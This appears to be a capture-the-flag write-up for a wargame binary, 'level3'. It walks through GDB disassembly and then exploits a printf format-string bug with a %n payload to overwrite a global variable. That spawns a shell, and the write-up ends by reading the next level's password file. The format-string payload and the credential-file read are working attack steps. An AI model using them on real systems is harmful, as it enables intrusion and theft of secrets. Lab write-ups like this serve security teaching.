# Level3

First step - testing the program

	$ ./level3
	coucou
	coucou

The program wait an input and print it

Start it in GDB

	(gdb-peda)$ pdisas main
	Dump of assembler code for function main:
	   0x0804851a <+0>:	push   ebp
	   0x0804851b <+1>:	mov    ebp,esp
	   0x0804851d <+3>:	and    esp,0xfffffff0
	   0x08048520 <+6>:	call   0x80484a4 <v>
	   0x08048525 <+11>:	leave
	   0x08048526 <+12>:	ret
	End of assembler dump.

The main call a function "v"

	(gdb-peda)$ pdisas v
	Dump of assembler code for function v:
	   0x080484a4 <+0>:		push   ebp
	   0x080484a5 <+1>:		mov    ebp,esp
	   0x080484a7 <+3>:		sub    esp,0x218
	   0x080484ad <+9>:		mov    eax,ds:0x8049860
	   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
	   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
	   0x080484be <+26>:	lea    eax,[ebp-0x208]
	   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
	   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
	   0x080484cc <+40>:	lea    eax,[ebp-0x208]
	   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
	   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
	   0x080484da <+54>:	mov    eax,ds:0x804988c
	   0x080484df <+59>:	cmp    eax,0x40
	   0x080484e2 <+62>:	jne    0x8048518 <v+116>
	   0x080484e4 <+64>:	mov    eax,ds:0x8049880
	   0x080484e9 <+69>:	mov    edx,eax
	   0x080484eb <+71>:	mov    eax,0x8048600
	   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
	   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
	   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
	   0x08048504 <+96>:	mov    DWORD PTR [esp],eax
	   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
	   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
	   0x08048513 <+111>:	call   0x80483c0 <system@plt>
	   0x08048518 <+116>:	leave
	   0x08048519 <+117>:	ret
	End of assembler dump.

There is a check on a variable "0x804988c" (global variable) for CMP with "64". If the comparaison is good, the program execute "system"

We can get the name of this global variable

	(gdb-peda)$ info variables
	All defined variables:

	Non-debugging symbols:
	...
	0x0804988c  m
	...

The name is "m"

Also, the program use printf without modifier, like this "printf(variable)"

This is insecure, it's a format string. We can exploit it

We can inject some modifier in the buffer for printf

	$ echo "%s" | ./level3
	Segmentation fault (core dumped)

Printf tried to acces to a parameter in the stack and segfault because he tried to access the value of an address on the stack

	$ echo "%x %x %x %x" | ./level3
	200 b7fd1ac0 b7ff37d0 25207825

With "%x", printf get directly the address. We can go up in the stack like this

We need to see in which address our buffer is wrote

	$ echo "BBBB %x %x %x %x %x %x" | ./level3
	BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825

Our buffer "BBBB" is stored in the 4th position in the stack "42424242"

Now, we need to change this address to the address of the "m" variable ("0x804988c" in gdb), for change it after

	$ python -c "print '\x8c\x98\x04\x08'+'%x %x %x %x'" | ./level3
	�200 b7fd1ac0 b7ff37d0 804988c

Ok good. Now we will use the modifier "%n" instead of "%x"

"%n" write in the address the number of bytes before

If we do this

	$ python -c "print '\x8c\x98\x04\x08'+'%x %x %x %n'" | ./level3

The number will be 4. Because our buffer "\x8c\x98\x04\x08" is 4 bytes

We can write it like this for a better view

	$ python -c "print '\x8c\x98\x04\x08'+'%4$n'" | ./level3

It's choose directly the 4th position and skip the 3 "%x" before

Now we need to write 64 in "m" for pass the condition. So just add 60 more bytes

	$ python -c 'print "\x8c\x98\x04\x08"+"B"*60+"%4$n"' | ./level3
	�BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
	Wait what?!

Good! Let's keep stdin open for access the shell

	$ (python -c 'print "\x8c\x98\x04\x08"+"B"*60+"%4$n"'; cat -) | ./level3
	�BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
	Wait what?!
	whoami
	level4
	cat ~level4/.pass
